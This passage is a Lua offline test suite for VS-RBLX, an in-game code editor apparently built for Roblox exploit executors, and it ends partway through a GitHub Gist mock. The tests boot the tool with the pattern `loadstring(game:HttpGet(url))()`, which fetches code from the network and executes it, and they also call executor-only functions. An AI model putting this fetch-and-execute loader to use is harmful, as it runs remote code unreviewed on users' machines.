-- Comprehensive Offline Test Suite for VS-RBLX (`test/run.lua`)
-- Verifies exact `loadstring(game:HttpGet(.../dist/vsrblx.lua))()` boot with ZERO host
-- loadfile fallback, Executor `writefile`/`readfile` disk persistence, Executor HTTP GitHub
-- clone/pull/commit/push, Window drag + auto-resize + 8-edge/corner player resize,
-- 17-language RichText syntax lexer, and locked-CoreGui PlayerGui fallback.

package.path = "./?.lua;./?/init.lua;test/?.lua;test/mock/?.lua;" .. package.path

local mockEnv = require("env")
local json = require("json")

local passed = 0
local failed = 0

local function check(name, fn)
	local ok, err = xpcall(fn, debug.traceback)
	if ok then
		passed = passed + 1
		io.write("PASS  " .. name .. "\n")
	else
		failed = failed + 1
		io.write("FAIL  " .. name .. "\n      " .. tostring(err):gsub("\n", "\n      ") .. "\n")
	end
end

local function assertEq(actual, expected, label)
	if actual ~= expected then
		error(string.format("%s: expected %s, got %s", label or "assertEq", tostring(expected), tostring(actual)), 2)
	end
end

local function assertTrue(val, label)
	if not val then
		error(string.format("%s: expected truthy, got %s", label or "assertTrue", tostring(val)), 2)
	end
end

local fhBundle = assert(io.open("dist/vsrblx.lua", "rb"), "dist/vsrblx.lua missing")
local bundleSource = fhBundle:read("*a")
fhBundle:close()

local RAW_URL = "https://raw.githubusercontent.com/TheStrongestOfTomorrow/VS-RBLX/main/dist/vsrblx.lua"

local H = mockEnv.new({ width = 1440, height = 900 })
H.onHttp(function(_req, url)
	if url == RAW_URL then
		return { StatusCode = 200, Body = bundleSource }
	end
end)

local api = nil

check("1. Boot dist/vsrblx.lua via loadstring(game:HttpGet(...))() with zero loadfile", function()
	assertEq(H.sandbox.loadfile, nil, "No host loadfile exposed in executor sandbox")
	local loaderChunk = assert(H.sandbox.loadstring(
		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))()',
		"@executor"
	))
	local ok, res = pcall(loaderChunk)
	assertTrue(ok and type(res) == "table", "Executor loadstring booted cleanly: " .. tostring(res))
	api = res

	assertEq(api.version, "1.0.0", "SDK version")
	assertTrue(api.buildId:find("^1%.0%.0%-") ~= nil, "Deterministic FNV-1a build ID bound from __VSRBLX_BUILD")
	assertTrue(api._env.moduleTotal == 82, "All 82 __VSRBLX_MODULES registered in lexical table")
	assertTrue(H.sandbox.getgenv().VSRBLX == api, "Registered on getgenv().VSRBLX")

	local gui = H.screen()
	assertTrue(gui ~= nil and gui.Name == "VSRBLX_Workbench", "ScreenGui mounted inside gethui()")
	assertTrue(H.byName("VSCodeWindow") ~= nil, "VSCodeWindow exists")
	assertTrue(H.byName("TitleBar") ~= nil, "TitleBar exists")
	assertTrue(H.byName("ActivityBar") ~= nil, "ActivityBar exists")
	assertTrue(H.byName("PrimarySideBar") ~= nil, "PrimarySideBar exists")
	assertTrue(H.byName("PrimaryEditorPane") ~= nil, "PrimaryEditorPane exists")
	assertTrue(H.byName("BottomPanelContainer") ~= nil, "BottomPanelContainer exists")
	assertTrue(H.byName("StatusBar") ~= nil, "StatusBar exists")
end)

check("2. Executor Disk Persistence via writefile / readfile", function()
	assertTrue(api.fs.isBackedByDisk(), "fsx detected executor writefile/readfile")
	assertTrue(H.sandbox.isfile("VSRBLX/workspaces/default/src/main.luau"), "Starter Luau file written to disk")

	local sampleCode = "local Players = game:GetService('Players')\nprint('Loaded', #Players:GetPlayers())\n"
	local ok = api.writeFile("src/network_client.luau", sampleCode)
	assertTrue(ok, "api.writeFile succeeded")

	local rawOnDisk = H.sandbox.readfile("VSRBLX/workspaces/default/src/network_client.luau")
	assertEq(rawOnDisk, sampleCode, "Exact bytes written via executor writefile")
	assertEq(api.readFile("src/network_client.luau"), sampleCode, "Exact bytes read via executor readfile")

	local doc = api.openFile("src/network_client.luau")
	assertTrue(doc ~= nil, "Opened document tab")
	local updatedCode = sampleCode .. "-- Saved via Ctrl+S\n"
	api.codeStore.updateContent(doc.id, updatedCode)
	assertTrue(doc.dirty == true, "Document marked dirty")

	api.runCommand("file.save")
	assertTrue(doc.dirty == false, "Document clean after save")
	assertEq(H.sandbox.readfile("VSRBLX/workspaces/default/src/network_client.luau"), updatedCode, "Ctrl+S persisted via writefile")
end)

check("3. GitHub Repository Clone, Pull & Atomic Commit/Push via Executor HTTP", function()
	local pushedCommitPayload = nil
	local patchedRefPayload = nil

	H.onHttp(function(req, url, method)
		if url == "https://api.github.com/user" then
			return { StatusCode = 200, Body = { login = "RobloxArchitect", id = 42 } }
		elseif url == "https://api.github.com/repos/OctoDev/CombatEngine" then
			return { StatusCode = 200, Body = { full_name = "OctoDev/CombatEngine", default_branch = "main" } }
		elseif url:find("/repos/OctoDev/CombatEngine/branches") then
			return { StatusCode = 200, Body = { { name = "main" }, { name = "dev" } } }
		elseif url:find("git/trees/main%?recursive=1") then
			return {
				StatusCode = 200,
				Body = {
					sha = "tree_sha_001",
					tree = {
						{ path = "README.md", type = "blob", size = 38, sha = "b1" },
						{ path = "src/sword.luau", type = "blob", size = 64, sha = "b2" },
						{ path = "web/hud.ts", type = "blob", size = 48, sha = "b3" },
					},
				},
			}
		elseif url:find("raw%.githubusercontent%.com/OctoDev/CombatEngine/main/README%.md") then
			return { StatusCode = 200, Body = "# CombatEngine\nSynced via VS-RBLX\n" }
		elseif url:find("raw%.githubusercontent%.com/OctoDev/CombatEngine/main/src/sword%.luau") then
			return { StatusCode = 200, Body = "local Sword = {}\nfunction Sword.swing() return 25 end\nreturn Sword\n" }
		elseif url:find("raw%.githubusercontent%.com/OctoDev/CombatEngine/main/web/hud%.ts") then
			return { StatusCode = 200, Body = "export const MAX_HP: number = 100;\n" }
		elseif url:find("git/ref/heads/main") then
			return { StatusCode = 200, Body = { object = { sha = "head_commit_100" } } }
		elseif url:find("git/commits/head_commit_100") then
			return { StatusCode = 200, Body = { sha = "head_commit_100", tree = { sha = "base_tree_100" } } }
		elseif url:find("git/blobs") and method == "POST" then
			return { StatusCode = 201, Body = { sha = "new_blob_sha_200" } }
		elseif url:find("git/trees$") and method == "POST" then
			return { StatusCode = 201, Body = { sha = "new_tree_sha_200" } }
		elseif url:find("git/commits$") and method == "POST" then
			pushedCommitPayload = json.decode(req.Body)
			return { StatusCode = 201, Body = { sha = "pushed_commit_9999999" } }
		elseif url:find("git/refs/heads/main") and method == "PATCH" then
			patchedRefPayload = json.decode(req.Body)
			return { StatusCode = 200, Body = { ref = "refs/heads/main" } }
		end
	end)

	local user, authErr = api.github.authenticate("ghp_mocktoken123")
	assertTrue(user ~= nil, "Authenticated GitHub PAT: " .. tostring(authErr))
	assertEq(user.login, "RobloxArchitect", "GitHub username")

	local summary, cloneErr = api.cloneRepo("OctoDev/CombatEngine")
	assertTrue(summary ~= nil, "Cloned OctoDev/CombatEngine: " .. tostring(cloneErr))
	assertEq(summary.filesWritten, 3, "Wrote 3 repo files to disk")
	assertTrue(H.sandbox.isfile("VSRBLX/workspaces/OctoDev__CombatEngine/src/sword.luau"), "Cloned Luau file exists on executor disk")

	api.writeFile("src/sword.luau", "local Sword = {}\nfunction Sword.swing() return 50 end\nreturn Sword\n")
	local st = api.git.status()
	assertEq(st.total, 1, "Git status tracked 1 modified file")

	local pushRes, pushErr = api.commitAndPush("Buff sword swing damage to 50")
	assertTrue(pushRes ~= nil, "Committed and pushed to GitHub REST API: " .. tostring(pushErr))
	assertEq(pushRes.sha, "pushed_commit_9999999", "Returned new commit SHA")
	assertEq(pushedCommitPayload.message, "Buff sword swing damage to 50", "Commit message sent in HTTP POST")
	assertEq(patchedRefPayload.sha, "pushed_commit_9999999", "Branch ref fast-forwarded via HTTP PATCH")
end)

check("4. Window Dragging, Viewport Auto-Resize, & 8-Direction Player Resizing", function()
	local winRoot = H.byName("VSCodeWindow")
	local titleBar = H.byName("TitleBar")
	local resizeBR = H.byName("ResizeBottomRight")
	local resizeTL = H.byName("ResizeTopLeft")

	assertTrue(winRoot and titleBar and resizeBR and resizeTL, "Window & resize handles exist")

	api.runCommand("window.center")
	local initX = winRoot.Position.X.Offset
	local initY = winRoot.Position.Y.Offset

	-- (A) TitleBar Dragging by Player
	H.drag(titleBar, 380, initY + 14, 440, initY + 49)
	assertEq(winRoot.Position.X.Offset, initX + 60, "Window dragged +60px horizontally")
	assertEq(winRoot.Position.Y.Offset, initY + 35, "Window dragged +35px vertically")

	-- (B) Player Manual Resizing via Bottom-Right Corner Handle
	local preW = winRoot.Size.X.Offset
	local preH = winRoot.Size.Y.Offset
	H.drag(resizeBR, 800, 600, 890, 650)
	assertTrue(winRoot.Size.X.Offset > preW, "Bottom-Right handle expanded window width")
	assertTrue(winRoot.Size.Y.Offset > preH, "Bottom-Right handle expanded window height")

	-- (C) Player Manual Resizing via Top-Left Corner Handle
	local preTLW = winRoot.Size.X.Offset
	H.drag(resizeTL, 200, 150, 240, 170)
	assertTrue(winRoot.Size.X.Offset < preTLW, "Top-Left handle shrunk window width inward")

	-- (D) Auto-Resize on Viewport Change (shrinking screen to 820x520)
	H.setViewport(820, 520)
	assertTrue(winRoot.Size.X.Offset <= 820, "Auto-resize clamped window width to 820px viewport")
	assertTrue(winRoot.Size.Y.Offset <= 520, "Auto-resize clamped window height to 520px viewport")

	-- (E) Maximize / Restore (`F11`)
	H.setViewport(1440, 900)
	local usable = api._env.require("ui/responsive").usableRect(0)
	api.runCommand("window.maximize")
	assertEq(winRoot.Size.X.Offset, usable.width, "Maximized fills usable viewport width")
	assertEq(winRoot.Size.Y.Offset, usable.height, "Maximized fills usable viewport height")
	api.runCommand("window.maximize")
	assertTrue(winRoot.Size.X.Offset < usable.width, "Restored previous floating bounds")
end)

check("5. 17-Language Syntax Lexer, IntelliSense, Diagnostics, Search, Formatter & Terminal", function()
	local lexer = api._env.require("runtime/code_lexer")
	local languages = api._env.require("runtime/languages")
	local intellisense = api._env.require("runtime/intellisense")
	local diagnostics = api._env.require("runtime/diagnostics")
	local formatter = api._env.require("tools/formatter")
	local terminalCmds = api._env.require("tools/terminal_cmds")

	assertTrue(#languages.list >= 17, "At least 17 language definitions registered")

	local samples = {
		luau = "local function greet(name)\n\treturn 'Hello ' .. tostring(name)\nend",
		typescript = "export interface PlayerStats { score: number; active: boolean; }",
		python = "async def fetch_data(url: str) -> dict:\n    return {'ok': True}",
		rust = "pub fn compute(v: &[i32]) -> i32 { let mut sum = 0; sum }",
		cpp = "#include <vector>\nint main() { return 0; }",
		json = '{"name": "VS-RBLX", "version": 1, "enabled": true}',
		html = '<div class="ide"><span>Hello</span></div>',
		css = ".ide { background: #1e1e1e; color: #d4d4d4; }",
		sql = "SELECT id, username FROM players WHERE score >= 100 ORDER BY score DESC;",
	}
	for langId, code in pairs(samples) do
		local cache = lexer.scan(code, langId)
		local richLine = lexer.rich(cache.lines[1], cache.spans[1], api.theme.syntax)
		assertTrue(richLine:find("<font color=", 1, true) ~= nil, "Generated RichText syntax tags for " .. langId)
	end

	local sugs = intellisense.suggest("local x = writef", 17, "luau", 8)
	assertTrue(#sugs >= 1 and sugs[1].label == "writefile", "IntelliSense suggested executor writefile")

	local badJsonDoc = api.codeStore.newUntitled('{"unclosed": [1, 2}', "json")
	local jsonDiags = diagnostics.check(badJsonDoc)
	assertTrue(#jsonDiags >= 1, "JSON syntax checker caught invalid JSON")

	local uglyJson = '{"a":1,"b":[true,false]}'
	local prettyJson = formatter.formatText(uglyJson, "json")
	assertTrue(prettyJson:find("\n", 1, true) ~= nil, "JSON formatter pretty-printed object")

	terminalCmds.execute("ls")
	terminalCmds.execute("luau return 6 * 7")
	assertTrue(terminalCmds.lines[#terminalCmds.lines]:find("42", 1, true) ~= nil, "Terminal REPL evaluated 6 * 7 = 42")

	api.runCommand("editor.toggleSplit")
	assertTrue(api.codeStore.splitOpen == true, "Split editor enabled")
	api.runCommand("editor.toggleSplit")
	assertTrue(api.codeStore.splitOpen == false, "Split editor closed")

	for _, th in ipairs(api.theme.list()) do
		assertTrue(api.setTheme(th.id), "Switched to theme " .. th.id)
	end
	api.setTheme("dark_plus")
end)

check("6. Phase 1 QoL: Ghost Opacity, Zen Mode, Seti Icons, Inline Explorer, Dirty Prompt & TODOs", function()
	-- (A) Ghost-Coding Opacity Slider (`30%–100%`)
	assertTrue(H.byName("OpacitySliderPill") ~= nil, "OpacitySliderPill mounted in TitleBar")
	assertEq(api.getOpacity(), 1.0, "Default opacity is 100%")
	api.setOpacity(0.45)
	assertEq(api.getOpacity(), 0.45, "Opacity updated to 45%")
	local editorsRegion = H.byName("EditorsRegion")
	assertTrue(math.abs(editorsRegion.BackgroundTransparency - 0.55) < 0.01, "EditorsRegion became 55% transparent without stacking")
	api.setOpacity(0.10)
	assertEq(api.getOpacity(), 0.30, "Opacity clamped at 30% minimum")
	api.runCommand("window.opacityReset")
	assertEq(api.getOpacity(), 1.0, "window.opacityReset restored 100% opacity")

	-- (B) Zen Mode (`Ctrl+Shift+Z`) enter & exact layout state restore
	local actBar = H.byName("ActivityBar")
	local sideBar = H.byName("PrimarySideBar")
	local statusBar = H.byName("StatusBar")
	local zenPill = H.byName("ZenExitPill")
	assertTrue(actBar.Visible == true and sideBar.Visible == true and statusBar.Visible == true, "Chrome visible before Zen Mode")
	api.toggleZenMode()
	assertTrue(api.app.isZenMode() == true, "Zen Mode active")
	assertTrue(actBar.Visible == false and sideBar.Visible == false and statusBar.Visible == false, "Chrome hidden in Zen Mode")
	assertTrue(zenPill.Visible == true, "Floating ZenExitPill shown")
	api.toggleZenMode()
	assertTrue(api.app.isZenMode() == false, "Zen Mode exited")
	assertTrue(actBar.Visible == true and sideBar.Visible == true and statusBar.Visible == true, "Pre-Zen layout restored")

	-- (C) Crisp Seti File Badges
	assertTrue(H.byName("SetiBadge") ~= nil, "Seti file badges rendered in Explorer & Tabs")

	-- (D) Inline Explorer Create + Validation + Inline Rename (preserving open tab)
	local tree = api.app.viewlets.explorer.fileTree
	tree.promptNewFile("src")
	assertTrue(H.byName("InlineExplorerInput") ~= nil, "Inline Explorer TextBox rendered directly inside file tree")
	local badOk, badErr = tree.commitInline("bad:name?.luau")
	assertTrue(badOk == false and badErr ~= nil, "Inline Explorer rejected invalid filename characters")
	assertTrue(H.byName("InlineErrorBanner").Visible == true, "Inline validation error banner displayed")

	local createOk, createdPath = tree.commitInline("abilities.luau")
	assertTrue(createOk == true and createdPath == "src/abilities.luau", "Inline Explorer created src/abilities.luau")
	local abilDoc = api.codeStore.findByPath("src/abilities.luau")
	assertTrue(abilDoc ~= nil, "Newly created file automatically opened in editor")
	api.codeStore.updateContent(abilDoc.id, "-- TODO: balance cooldowns\n-- FIXME: fix mana cost\nreturn { dash = 5 }\n")

	-- Inline rename open file -> keeps open tab & undo stack intact!
	assertTrue(tree.startRename("src/abilities.luau"), "Started inline rename on src/abilities.luau")
	local renOk, renPath = tree.commitInline("skills.luau")
	assertTrue(renOk == true and renPath == "src/skills.luau", "Renamed to src/skills.luau on disk")
	local renamedDoc = api.codeStore.findByPath("src/skills.luau")
	assertTrue(renamedDoc == abilDoc and renamedDoc.title == "skills.luau", "Open tab seamlessly re-bound on rename")
	assertTrue(#renamedDoc.undoStack >= 1, "Undo stack preserved across inline rename")

	-- (E) TODO / FIXME / NOTE Lexer Highlighting & Workspace Scanner
	local lexer = api._env.require("runtime/code_lexer")
	local scanned = lexer.scan(renamedDoc.content, "luau")
	local richTodo = lexer.rich(scanned.lines[1], scanned.spans[1], api.theme.syntax)
	assertTrue(richTodo:find("#ffcc00", 1, true) ~= nil, "Lexer highlighted TODO: in bold gold")
	local richFixme = lexer.rich(scanned.lines[2], scanned.spans[2], api.theme.syntax)
	assertTrue(richFixme:find("#f14c4c", 1, true) ~= nil, "Lexer highlighted FIXME: in bold red")

	local todoItems, todoCounts = api.todos.scanAll()
	assertTrue(todoCounts.total >= 2 and todoCounts.fixme >= 1 and todoCounts.todo >= 1, "todo_scanner indexed TODO & FIXME tags")
	api.runCommand("view.todos")
	assertTrue(H.byName("TodosView").Visible == true, "view.todos focused Bottom Panel TODOS tab")

	-- (F) Dirty-Tab Close Confirmation Prompt (Save / Don't Save / Cancel)
	assertTrue(renamedDoc.dirty == true, "skills.luau is dirty before close")
	local closeRes = api.codeStore.requestClose(renamedDoc.id)
	assertEq(closeRes, "prompted", "Dirty tab close opened confirmation modal instead of losing work")
	assertTrue(H.byName("ConfirmModal") ~= nil, "VS Code ConfirmModal mounted")
	-- Click "Save" (`ConfirmPrimaryBtn`) to save to disk and close cleanly
	H.click(H.byName("ConfirmPrimaryBtn"))
	assertTrue(api.codeStore.findByPath("src/skills.luau") == nil, "Tab closed after confirming Save")
	assertTrue(H.sandbox.readfile("VSRBLX/workspaces/OctoDev__CombatEngine/src/skills.luau"):find("FIXME: fix mana cost", 1, true) ~= nil, "Confirm Save persisted buffer via writefile")
end)

check("7. Combined Phase 2+3: Monaco Smart Typing, Color Picker, Clipboard 15-Ring, Visuals & Crash Recovery", function()
	-- (A) 15-Slot Persistent Clipboard Ring
	api.clipboard.clear()
	for i = 1, 18 do
		api.clipboard.copy("snippet_" .. tostring(i))
	end
	local hist = api.clipboard.list()
	assertEq(#hist, 15, "Clipboard ring capped at 15 slots")
	assertEq(hist[1].text, "snippet_18", "Most recent copy at slot 1")
	api.clipboard.copy("snippet_10")
	assertEq(api.clipboard.list()[1].text, "snippet_10", "Duplicate copy promoted to slot 1 without growing past 15")

	-- (B) Smart Typing: Auto-close pairs, Overtype, Empty-Pair Backspace, Smart Enter Indent & `{}` Expansion
	local ea = api.editorActions
	local paired, cur1 = ea.applySmartTyping("local t = ", "local t = {", 12, { langId = "luau", tabSize = 4, insertSpaces = true })
	assertEq(paired, "local t = {}", "Auto-closed { -> {}")
	assertEq(cur1, 12, "Cursor placed between { and }")

	local expanded, cur2 = ea.applySmartTyping("local t = {}", "local t = {\n}", 13, { langId = "luau", tabSize = 4, insertSpaces = true })
	assertEq(expanded, "local t = {\n    \n}", "Smart Enter between {} expanded 3-line indented block")
	assertEq(cur2, 17, "Cursor positioned at inner indent stop")

	local overtyped, cur3 = ea.applySmartTyping("call()", "call())", 7, { langId = "luau" })
	assertEq(overtyped, "call()", "Closing ) overtyped instead of duplicating")
	assertEq(cur3, 7, "Cursor stepped past closing )")

	local bsPair, cur4 = ea.applySmartTyping("call()", "call)", 5, { langId = "luau" })
	assertEq(bsPair, "call", "Backspacing opening ( in empty () removed both")
	assertEq(cur4, 5, "Cursor stayed clean after pair backspace")

	local luauIf, _ = ea.applySmartTyping("if ready then", "if ready then\n", 15, { langId = "luau", tabSize = 4, insertSpaces = true })
	assertEq(luauIf, "if ready then\n    ", "Smart Enter after Luau `then` auto-indented 4 spaces")

	-- (C) Live Editor Actions: Comment Toggle (`Ctrl+/`), Move Line, Duplicate, Delete, Undo/Redo
	api.writeFile("src/theme_demo.luau", table.concat({
		"local function paintHero(card)",
		"    local accent = Color3.fromRGB(255, 85, 119)",
		"    local glow = '#4ec9b0'",
		"    return { card = (accent) }",
		"end",
	}, "\n"))
	local demoDoc = api.openFile("src/theme_demo.luau")
	local ed = api.app.primaryEditor
	ed.box.CursorPosition = 1
	ed.box.SelectionStart = -1

	api.runCommand("editor.toggleComment")
	assertTrue(demoDoc.content:find("^%-%- local function paintHero") ~= nil, "Ctrl+/ commented Luau line")
	api.runCommand("editor.toggleComment")
	assertTrue(demoDoc.content:find("^local function paintHero") ~= nil, "Ctrl+/ uncommented Luau line")

	api.runCommand("editor.duplicateLineDown")
	local dupLines = api._env.require("runtime/util").lines(demoDoc.content)
	assertEq(dupLines[1], dupLines[2], "Shift+Alt+Down duplicated line 1")

	api.runCommand("edit.undo")
	assertEq(#api._env.require("runtime/util").lines(demoDoc.content), 5, "Ctrl+Z undid line duplication")
	api.runCommand("edit.redo")
	assertEq(#api._env.require("runtime/util").lines(demoDoc.content), 6, "Ctrl+Y redid line duplication")
	api.runCommand("edit.undo")

	-- (D) Inline Color Swatches + HSV Color Picker Format-Preserving Rewrite
	local swatch1 = H.byName("ColorSwatch_1")
	assertTrue(swatch1 ~= nil and swatch1.Visible == true, "Inline ColorSwatch_1 rendered for Color3.fromRGB(255, 85, 119)")
	H.click(swatch1)
	assertTrue(H.byName("InlineColorPicker").Visible == true, "Clicking swatch opened HSV InlineColorPicker")
	ed.colorPicker.setRgb(16, 200, 140)
	assertTrue(demoDoc.content:find("Color3.fromRGB(16, 200, 140)", 1, true) ~= nil, "HSV Color Picker rewrote Color3.fromRGB in-place")
	ed.colorPicker.close()

	-- (E) Rainbow Brackets, Indent Guides, Sticky Scroll & Inline Error Squiggles
	local lexer = api._env.require("runtime/code_lexer")
	local nestScan = lexer.scan("call(outer[inner{1}])", "luau")
	local richNest = lexer.rich(nestScan.lines[1], nestScan.spans[1], api.theme.syntax)
	assertTrue(richNest:find("#ffd700", 1, true) ~= nil and richNest:find("#da70d6", 1, true) ~= nil and richNest:find("#179fff", 1, true) ~= nil,
		"Rainbow brackets colored depth 1/2/3 in gold, orchid, and blue")

	assertTrue(H.byName("IndentGuide_1") ~= nil and H.byName("IndentGuide_1").Visible == true, "Vertical indent guides rendered")

	-- Scroll past line 1 inside `paintHero` -> Sticky Scroll bar pins `local function paintHero(card)`
	H.byName("EditorScroll").CanvasPosition = H.sandbox.Vector2.new(0, 42)
	assertTrue(H.byName("StickyScrollBar").Visible == true, "StickyScrollBar pinned enclosing function signature while scrolling")
	H.byName("EditorScroll").CanvasPosition = H.sandbox.Vector2.new(0, 0)

	-- Syntax error triggers inline squiggle underline + Error Lens
	api.codeStore.updateContent(demoDoc.id, "local broken = (\n")
	api._env.require("runtime/diagnostics").check(demoDoc)
	ed.refresh()
	assertTrue(H.byName("DiagUnderline_1") ~= nil and H.byName("DiagUnderline_1").Visible == true, "Inline error squiggle underline rendered")
	assertTrue(H.byName("ErrorLens_1") ~= nil and H.byName("ErrorLens_1").Visible == true, "Inline Error Lens message rendered")

	-- (F) Keymap Preset Switcher
	api.runCommand("workbench.keymapPreset")
	assertEq(api.config.get("keybindings.preset"), "sublime", "Cycled keymap preset to sublime")
	api.config.set("keybindings.preset", "vscode", { immediate = true })

	-- (G) Crash-Proof Session & Unsaved Draft Auto-Recovery across reboot
	api.codeStore.updateContent(demoDoc.id, "-- UNSAVED_CRASH_DRAFT_MARKER_999\nreturn true\n")
	assertTrue(demoDoc.dirty == true, "Buffer is dirty and NOT saved via Ctrl+S")
	assertTrue(api.session.saveNow() == true, "Session journal snapshot written to disk")

	-- Simulate abrupt reload with `reload = true` and verify unsaved draft is restored!
	local rebootChunk = assert(H.sandbox.loadstring(
		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))({ reload = true })',
		"@executor_reboot"
	))
	local rebootedApi = rebootChunk()
	assertTrue(rebootedApi ~= nil and rebootedApi ~= api, "Fresh VSRBLX instance mounted after simulated crash")
	api = rebootedApi
	local recoveredDoc = api.codeStore.findByPath("src/theme_demo.luau")
	assertTrue(recoveredDoc ~= nil and recoveredDoc.dirty == true, "Session journal reopened dirty tab")
	assertTrue(recoveredDoc.content:find("UNSAVED_CRASH_DRAFT_MARKER_999", 1, true) ~= nil, "Exact unsaved draft content recovered after reboot!")
end)

check("8. Combined Sprint 3: Multi-Session Terminal, Roblox LogService & Eyedropper, Bundler, Side-by-Side Diff, Gist & Settings Sync", function()
	-- (A) Multi-Session Terminal + UNIX CLI + History + Tab Autocomplete
	local sess1 = api.terminal.activeSession()
	local okTerm, sess2 = api.runCommand("terminal.newSession")
	assertTrue(okTerm and sess2 ~= nil and sess2.id ~= sess1.id, "Created second terminal session")
	assertEq(#api.terminal.sessions, 2, "Two concurrent terminal sessions active")

	api.terminal.execute('echo "return { answer = 42 }" > src/helper_mod.luau')
	assertTrue(api.readFile("src/helper_mod.luau"):find("answer = 42", 1, true) ~= nil, "Terminal echo > redirection wrote src/helper_mod.luau")
	api.terminal.execute("cp src/helper_mod.luau src/helper_copy.luau")
	assertTrue(api.workspace.exists("src/helper_copy.luau"), "Terminal cp copied file on disk")
	api.terminal.execute("mv src/helper_copy.luau src/helper_renamed.luau")
	assertTrue(api.workspace.exists("src/helper_renamed.luau") and not api.workspace.exists("src/helper_copy.luau"), "Terminal mv renamed file on disk")
	api.terminal.execute("tree src")
	api.terminal.execute("ls -l src")
	api.terminal.execute("wc src/helper_mod.luau")
	api.terminal.execute("grep answer")

	assertEq(api.terminal.historyPrev(), "grep answer", "Terminal Up-arrow history recalled last command")
	assertEq(api.terminal.historyPrev(), "wc src/helper_mod.luau", "Terminal Up-arrow history walked backward")
	assertEq(api.terminal.historyNext(), "grep answer", "Terminal Down-arrow history walked forward")

	local compCmd = api.terminal.autocomplete("bun")
	assertEq(compCmd, "bundle", "Tab autocomplete expanded `bun` -> `bundle`")
	local compGitPrefix = api.terminal.autocomplete("git st")
	assertEq(compGitPrefix, "git sta", "Tab autocomplete expanded common prefix `git st` -> `git sta` (stage/status)")
	local compGit = api.terminal.autocomplete("git stag")
	assertEq(compGit, "git stage", "Tab autocomplete expanded `git stag` -> `git stage`")
	local compPath = api.terminal.autocomplete("cat src/helper_r")
	assertEq(compPath, "cat src/helper_renamed.luau", "Tab autocomplete expanded workspace file path")

	assertTrue(api.terminal.closeSession(sess2.id) == true, "Closed second terminal session")
	assertEq(api.terminal.activeSessionId, sess1.id, "Returned to primary terminal session")

	-- (B) Live Roblox LogService Stream + Clickable Stack-Trace Jump
	api.writeFile("src/stack_target.luau", "local a = 1\nlocal b = 2\nerror('boom')\n")
	H.logService.MessageOut:Fire("[string \"src/stack_target.luau\"]:3: attempt to index nil", H.Enum.MessageType.MessageError)
	local rblxLogs = api._env.require("runtime/log").list("roblox")
	assertTrue(#rblxLogs >= 1, "LogService.MessageOut streamed error into roblox output channel")
	local jumped = api.robloxConsole.jumpToLogEntry(rblxLogs[#rblxLogs])
	assertTrue(jumped == true, "Clicked stack trace jumped to matching workspace file")
	assertEq(api.codeStore.active().path, "src/stack_target.luau", "Opened stack trace target file")
	assertEq(api.codeStore.active().view.line, 3, "Jumped directly to error line 3")

	-- (C) Roblox DataModel Luau Path Generator, CLI & 3D Eyedropper Instance Picker
	local brickPath = api.robloxExplorer.luauPathOf(H.killBrick)
	assertEq(brickPath, 'workspace.ArenaMap["Lava Platform"]', "Generated bracket-escaped Luau path for 3D Part")
	local resolvedInst = api.robloxExplorer.resolvePath('workspace.ArenaMap["Lava Platform"]')
	assertTrue(resolvedInst == H.killBrick, "robloxExplorer.resolvePath resolved bracketed path back to Part")
	local props = api.robloxExplorer.inspectProperties(H.killBrick)
	assertTrue(#props >= 3, "robloxExplorer.inspectProperties extracted Instance properties")

	local scratchDoc = api.openFile("src/eyetest.luau") or api.codeStore.newUntitled("", "luau")
	api.writeFile("src/eyetest.luau", "local part = ")
	scratchDoc = api.openFile("src/eyetest.luau", { reloadFromDisk = true })
	api.app.primaryEditor.box.CursorPosition = #scratchDoc.content + 1
	api.app.primaryEditor.box.SelectionStart = -1

	api.runCommand("roblox.pickInstance")
	assertTrue(api.instancePicker.active == true, "Eyedropper mode activated and temporarily hid main window")
	-- Simulate clicking in 3D viewport where mouse.Target == H.killBrick
	H.uis.InputBegan:Fire({
		UserInputType = H.Enum.UserInputType.MouseButton1,
		Position = H.dt.Vector3.new(500, 400, 0),
	})
	assertTrue(api.instancePicker.active == false, "Eyedropper completed on 3D click and restored window")
	assertEq(scratchDoc.content, 'local part = workspace.ArenaMap["Lava Platform"]', "Eyedropper inserted exact Luau path at cursor!")

	-- (D) 1-Click Standalone Multi-File Workspace Bundler & Execution Verification
	api.writeFile("src/main.luau", 'local h = require("src/helper_mod")\nreturn h.answer * 2\n')
	local okBundle, bundleRes = api.runCommand("workspace.bundle")
	assertTrue(okBundle and bundleRes ~= nil, "Bundled multi-file workspace")
	assertTrue(H.sandbox.isfile(api.workspace.diskPath(bundleRes.outputPath)), "Standalone bundle written to dist/")
	local bundledChunk = assert(H.sandbox.loadstring(bundleRes.content, "@bundled_project"))
	assertEq(bundledChunk(), 84, "Generated standalone bundle executed `require('src/helper_mod')` and returned 84!")

	-- (E) 2-Pane Side-by-Side Diff + Live Gutter Diff Bars + GitHub Gist Import/Publish
	api.git.recordSnapshot("TheStrongestOfTomorrow/DemoRepo", "main", "abc1234", {
		["src/main.luau"] = 'local h = require("src/helper_mod")\nreturn h.answer\n',
	})
	local mainDoc = api.openFile("src/main.luau", { reloadFromDisk = true })
	api.codeStore.updateContent(mainDoc.id, 'local h = require("src/helper_mod")\nlocal bonus = 10\nreturn h.answer + bonus\n')
	local markers = api.codeDiff.lineMarkers(api.git.originalContent("src/main.luau"), mainDoc.content)
	assertTrue(markers[2] ~= nil or markers[3] ~= nil, "Computed live Git gutter diff markers against HEAD")
	assertTrue(H.byName("GitDiffBar_2") ~= nil, "Editor gutter created GitDiffBar widgets")

	local diffDoc = api.codeStore.openDiff("src/main.luau", api.git.originalContent("src/main.luau"), mainDoc.content)
	assertTrue(diffDoc.isDiff == true, "Opened diff tab via codeStore.openDiff")
	assertTrue(H.byName("DiffSideBySideWrap").Visible == true, "2-Pane Side-by-Side Diff Viewer visible by default")
	H.click(H.byName("ToggleDiffModeBtn"))
	assertTrue(H.byName("DiffUnifiedScroll").Visible == true, "Toggled Diff Viewer to Unified mode")
	H.click(H.byName("ToggleDiffModeBtn"))
	assertTrue(H.byName("DiffSideBySideWrap").Visible == true, "Toggled Diff Viewer back to Side-by-Side mode")

	-- Mock GitHub Gist API for Import + Publish
	api.config.set("github.token", "ghp_test_token_123", { immediate = true })
	H.onHttp(function(req, url, method)
		if url == "https://api.github.com/gists/a1b2c3d4e5f60001" and method == "GET" then
			return {
				StatusCode = 200,
				Body = {
					files = {
						["utility_snippet.luau"] = { content = "return 'from_gist'\n" },
					},
				},
			}
		elseif url == "https://api.github.com/gists" and method == "POST" then
			local payload = json.decode(req.Body)
